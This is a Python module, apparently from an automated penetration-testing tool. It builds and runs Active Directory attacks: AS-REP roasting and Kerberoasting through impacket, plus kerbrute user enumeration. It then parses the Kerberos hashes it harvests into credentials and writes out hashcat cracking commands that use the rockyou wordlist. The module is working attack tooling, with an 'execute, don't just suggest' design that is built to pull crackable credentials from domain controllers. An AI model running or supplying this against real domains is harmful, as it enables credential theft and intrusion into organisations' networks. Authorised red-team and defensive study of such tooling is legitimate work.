"""Active Kerberos — AS-REP roasting and Kerberoasting (execute, don't just suggest).

The AD kill-chain composer (`adchain`) *names* the roasting steps; this module
*runs* the two that pay off earliest:

* **AS-REP roast** — no credentials needed: any account with "do not require
  pre-auth" hands back a crackable AS-REP. `impacket-GetNPUsers` against a user list.
* **Kerberoast** — with any domain credential, request every SPN's TGS for offline
  cracking. `impacket-GetUserSPNs -request`.

The deterministic core is the *parser*: it turns the tool output (`$krb5asrep$…`,
`$krb5tgs$…`) into findings + `kind="hash"` credentials, so the hashes flow straight
into the `crack` loop. Command builders fill in domain/DC/user; the CLI runs them
through an injectable runner (so tests never touch the network).
"""

from __future__ import annotations

import re

from ..core.state import Credential, Finding, Severity

_ASREP_RE = re.compile(r"\$krb5asrep\$[^\s]+")
_TGS_RE = re.compile(r"\$krb5tgs\$[^\s]+")
# The account name is embedded in the hash: $krb5asrep$23$user@REALM:...
_ASREP_USER_RE = re.compile(r"\$krb5asrep\$\d+\$([^@:]+)@", re.IGNORECASE)
# hashcat TGS format: $krb5tgs$23$*user$realm$spn*$checksum$edata
# The user field itself can contain a `$` (machine-accounts end in `$`), so the
# stop character is the following `$REALM$` — i.e. `$` followed by an uppercase
# letter/digit start of the realm, not the plain `$` inside `WEB01$`.
_TGS_USER_RE = re.compile(
    r"\$krb5tgs\$\d+\$\*([^*]+?)\$[A-Z0-9]", re.IGNORECASE)


def asrep_command(domain: str, dc_ip: str, userlist: str,
                  outfile: str | None = None) -> list[str]:
    """impacket-GetNPUsers AS-REP roast argv (no credentials)."""
    argv = ["impacket-GetNPUsers", f"{domain}/", "-usersfile", userlist,
            "-no-pass", "-dc-ip", dc_ip, "-format", "hashcat"]
    if outfile:
        argv += ["-outputfile", outfile]
    return argv


def kerberoast_command(domain: str, dc_ip: str, user: str, password: str,
                       outfile: str | None = None) -> list[str]:
    """impacket-GetUserSPNs Kerberoast argv (needs a domain credential)."""
    argv = ["impacket-GetUserSPNs", f"{domain}/{user}:{password}", "-request",
            "-dc-ip", dc_ip, "-outputfile", outfile or "tgs.hash"]
    return argv


def userenum_command(domain: str, dc_ip: str, userlist: str) -> list[str]:
    """kerbrute userenum argv — valid-user discovery without lockout risk."""
    return ["kerbrute", "userenum", "-d", domain, "--dc", dc_ip, userlist]


def parse_roast(text: str, *, host: str | None = None) -> list[Finding]:
    """Findings + creds from AS-REP / Kerberoast output.

    Each recovered hash becomes a HIGH finding (with the exact hashcat mode) and a
    ``kind="hash"`` credential so ``crack`` picks it up. Deterministic, offline.
    """
    out: list[Finding] = []
    seen: set[str] = set()
    for m in _ASREP_RE.finditer(text or ""):
        h = m.group(0).rstrip(",")
        if h in seen:
            continue
        seen.add(h)
        um = _ASREP_USER_RE.search(h)
        user = um.group(1) if um else "?"
        out.append(_hash_finding("AS-REP roastable", user, h, "18200", host))
    for m in _TGS_RE.finditer(text or ""):
        h = m.group(0).rstrip(",")
        if h in seen:
            continue
        seen.add(h)
        um = _TGS_USER_RE.search(h)
        user = um.group(1) if um else "?"
        out.append(_hash_finding("Kerberoastable (TGS)", user, h, "13100", host))
    return out


def _hash_finding(kind: str, user: str, h: str, mode: str,
                  host: str | None) -> Finding:
    return Finding(
        title=f"{kind} account: {user}",
        severity=Severity.HIGH,
        host=host,
        description=f"A {kind} hash was recovered for '{user}'. Crack it offline "
                    f"(hashcat -m {mode}) and reuse the plaintext.",
        evidence=h[:400],
        exploit=f"hashcat -m {mode} '{h[:60]}...' /usr/share/wordlists/rockyou.txt",
        # We actually pulled the hash off the wire — that is proof, not a guess.
        validation="confirmed", proof=f"recovered {kind} hash for {user}",
    )


def creds_from_roast(text: str) -> list[Credential]:
    """The recovered AS-REP/TGS hashes as standalone credentials (kind='hash').

    Feeds the `crack` loop directly (hashcrack identifies krb5asrep/krb5tgs).
    """
    creds: list[Credential] = []
    seen: set[str] = set()
    for rex, user_rex, src in ((_ASREP_RE, _ASREP_USER_RE, "AS-REP roast"),
                               (_TGS_RE, _TGS_USER_RE, "Kerberoast")):
        for m in rex.finditer(text or ""):
            h = m.group(0).rstrip(",")
            if h in seen:
                continue
            seen.add(h)
            um = user_rex.search(h)
            creds.append(Credential(username=um.group(1) if um else None,
                                    secret=h, kind="hash", source=src))
    return creds
